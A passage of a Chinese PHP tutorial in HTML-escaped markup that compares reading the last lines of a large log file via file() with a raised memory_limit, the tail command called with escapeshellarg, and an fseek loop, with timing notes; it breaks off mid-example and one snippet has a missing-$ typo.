file函数是一次性将所有内容读入内存，而php为了防止一些写的比较糟糕的程序占用太多的内存而导致系统内存不足，使服务器出现宕机，所以默认情况下 限制只能最大使用内存16M,这是通过php.ini里的 memory_limit = 16M来进行设置，这个值如果设置-1，则内存使用量不受限制.&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;下面是一段用file来取出这具文件最后一行的代码.&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;dp-highlighter&quot; id=&quot;&quot; style=&quot;font-family:monaco, ''dejavu sans mono'', ''bitstream vera sans mono'', consolas, ''courier new'', monospace;font-size:12px;background-color:transparent;width:694px;overflow-x:auto;overflow-y:auto;margin-left:9px;padding-top:1px;padding-right:1px;padding-bottom:1px;padding-left:1px;word-break:break-all;word-wrap:break-word;&quot;&gt;&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;tools&quot; style=&quot;padding-top:3px;padding-right:3px;padding-bottom:3px;padding-left:3px;text-align:left;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;color:black;font-weight:bold;&quot;&gt;Php代码&amp;nbsp;&lt;embed src=&quot;http://justcoding.iteye.com/javascripts/syntaxhighlighter/clipboard_new.swf&quot; width=&quot;14&quot; height=&quot;15&quot; flashvars=&quot;clipboard=ini_set(''memory_limit''%2C''-1'')%3B%0A%24file%20%3D%20''access.log''%3B%0A%24data%20%3D%20file(%24file)%3B%0A%24line%20%3D%20%24data%5Bcount(%24data)-1%5D%3B%0Aecho%20%24line%3B&quot; quality=&quot;high&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&amp;nbsp;&lt;a href=&quot;http://justcoding.iteye.com/blog/986293&quot; title=&quot;收藏这段代码&quot; style=&quot;color:#006600;text-decoration:underline;&quot;&gt;&lt;img class=&quot;star&quot; src=&quot;http://justcoding.iteye.com/images/icon_star.png&quot; alt=&quot;收藏代码&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;font-size:1em;line-height:1.4em;margin-top:0px;margin-right:0px;margin-bottom:1px;margin-left:0px;padding-top:2px;padding-right:0px;padding-bottom:2px;padding-left:0px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:#d1d7dc;border-right-color:#d1d7dc;border-bottom-color:#d1d7dc;border-left-color:#d1d7dc;list-style-type:decimal;list-style-position:initial;list-style-image:initial;background-color:#ffffff;color:#2b91af;&quot;&gt;&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;ini_set&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''memory_limit''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''-1''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''access.log''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;file(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$line&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;count&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)-1];&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$line&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&amp;nbsp;&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;整个代码执行完成耗时 116.9613 (s).&lt;br /&gt;\r\n我机器是2个G的内存，当按下F5运行时，系统直接变灰，差不多20分钟后才恢复过来，可见将这么大的文件全部直接读入内存，后果是多少严重，所以不在万 不得以，memory_limit这东西不能调得太高，否则只有打电话给机房，让reset机器了.&lt;/p&gt;\r\n&lt;h3 style=&quot;font-size:1.2em;line-height:1.5em;margin-top:0px;margin-right:0px;margin-bottom:0.5em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:black;&quot;&gt;2.直接调用linux的tail命令来显示最 后几行&lt;/h3&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;在linux命令行下,可以直接使用tail -n 10 access.log很轻易的显示日志文件最后几行,可以直接用php来调用tail命令,执行php代码如下.&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;dp-highlighter&quot; id=&quot;&quot; style=&quot;font-family:monaco, ''dejavu sans mono'', ''bitstream vera sans mono'', consolas, ''courier new'', monospace;font-size:12px;background-color:transparent;width:694px;overflow-x:auto;overflow-y:auto;margin-left:9px;padding-top:1px;padding-right:1px;padding-bottom:1px;padding-left:1px;word-break:break-all;word-wrap:break-word;&quot;&gt;&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;tools&quot; style=&quot;padding-top:3px;padding-right:3px;padding-bottom:3px;padding-left:3px;text-align:left;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;color:black;font-weight:bold;&quot;&gt;Php代码&amp;nbsp;&lt;embed src=&quot;http://justcoding.iteye.com/javascripts/syntaxhighlighter/clipboard_new.swf&quot; width=&quot;14&quot; height=&quot;15&quot; flashvars=&quot;clipboard=file%20%3D%20''access.log''%3B%0A%24file%20%3D%20escapeshellarg(%24file)%3B%20%2F%2F%20%E5%AF%B9%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%BD%AC%E4%B9%89%0A%24line%20%3D%20%60tail%20-n%201%20%24file%60%3B%0Aecho%20%24line%3B&quot; quality=&quot;high&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&amp;nbsp;&lt;a href=&quot;http://justcoding.iteye.com/blog/986293&quot; title=&quot;收藏这段代码&quot; style=&quot;color:#006600;text-decoration:underline;&quot;&gt;&lt;img class=&quot;star&quot; src=&quot;http://justcoding.iteye.com/images/icon_star.png&quot; alt=&quot;收藏代码&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;font-size:1em;line-height:1.4em;margin-top:0px;margin-right:0px;margin-bottom:1px;margin-left:0px;padding-top:2px;padding-right:0px;padding-bottom:2px;padding-left:0px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:#d1d7dc;border-right-color:#d1d7dc;border-bottom-color:#d1d7dc;border-left-color:#d1d7dc;list-style-type:decimal;list-style-position:initial;list-style-image:initial;background-color:#ffffff;color:#2b91af;&quot;&gt;&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;file&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''access.log''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//&amp;nbsp;对命令行参数进行安全转义&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$line&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;`tail&amp;nbsp;-n&amp;nbsp;1&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;`;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$line&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&amp;nbsp;&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;整个代码执行完成耗时 0.0034 (s)&lt;/p&gt;\r\n&lt;h3 style=&quot;font-size:1.2em;line-height:1.5em;margin-top:0px;margin-right:0px;margin-bottom:0.5em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:black;&quot;&gt;3. 直接使用php的fseek来进行文件操作&lt;/h3&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;这种方式是最为普遍的方式,它不需要将文件的内容全部读入内容,而是直接通过指针来操作,所以效率是相当高效的.在使用fseek来对文件进行操作 时,也有多种不同的方法,效率可能也是略有差别的,下面是常用的两种方法.&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;方法一&lt;br /&gt;\r\n首先通过fseek找到文件的最后一位EOF，然后找最后一行的起始位置，取这一行的数据，再找次一行的起始位置， 再取这一行的位置，依次类推，直到找到了$num行。&lt;br /&gt;\r\n实现代码如下&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;dp-highlighter&quot; id=&quot;&quot; style=&quot;font-family:monaco, ''dejavu sans mono'', ''bitstream vera sans mono'', consolas, ''courier new'', monospace;font-size:12px;background-color:transparent;width:694px;overflow-x:auto;overflow-y:auto;margin-left:9px;padding-top:1px;padding-right:1px;padding-bottom:1px;padding-left:1px;word-break:break-all;word-wrap:break-word;&quot;&gt;&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;tools&quot; style=&quot;padding-top:3px;padding-right:3px;padding-bottom:3px;padding-left:3px;text-align:left;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;color:black;font-weight:bold;&quot;&gt;Php代码&amp;nbsp;&lt;embed src=&quot;http://justcoding.iteye.com/javascripts/syntaxhighlighter/clipboard_new.swf&quot; width=&quot;14&quot; height=&quot;15&quot; flashvars=&quot;clipboard=%24fp%20%3D%20fopen(%24file%2C%20%22r%22)%3B%0A%24line%20%3D%2010%3B%0A%24pos%20%3D%20-2%3B%0A%24t%20%3D%20%22%20%22%3B%0A%24data%20%3D%20%22%22%3B%0Awhile%20(%24line%20%3E%200)%20%7B%0A%20%20%20%20while%20(%24t%20!%3D%20%22%5Cn%22)%20%7B%0A%20%20%20%20%20%20%20%20fseek(%24fp%2C%20%24pos%2C%20SEEK_END)%3B%0A%20%20%20%20%20%20%20%20%24t%20%3D%20fgetc(%24fp)%3B%0A%20%20%20%20%20%20%20%20%24pos%20--%3B%0A%20%20%20%20%7D%0A%20%20%20%20%24t%20%3D%20%22%20%22%3B%0A%20%20%20%20%24data%20.%3D%20fgets(%24fp)%3B%0A%20%20%20%20%24line%20--%3B%0A%7D%0Afclose%20(%24fp)%3B%0Aecho%20%24data&quot; quality=&quot;high&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&amp;nbsp;&lt;a href=&quot;http://justcoding.iteye.com/blog/986293&quot; title=&quot;收藏这段代码&quot; style=&quot;color:#006600;text-decoration:underline;&quot;&gt;&lt;img class=&quot;star&quot; src=&quot;http://justcoding.iteye.com/images/icon_star.png&quot; alt=&quot;收藏代码&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;font-size:1em;line-height:1.4em;margin-top:0px;margin-right:0px;margin-bottom:1px;margin-left:0px;padding-top:2px;padding-right:0px;padding-bottom:2px;padding-left:0px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:#d1d7dc;border-right-color:#d1d7dc;border-bottom-color:#d1d7dc;border-left-color:#d1d7dc;list-style-type:decimal;list-style-position:initial;list-style-image:initial;background-color:#ffffff;color:#2b91af;&quot;&gt;&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fopen&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$line&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;10;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$pos&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;-2;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$t&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;&amp;nbsp;&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;while&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$line&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;gt;&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;while&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$t&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;!=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;\\n&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fseek&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$pos&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;SEEK_END);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$t&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fgetc&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$pos&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;--;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$t&lt;/span&gt;&lt;span 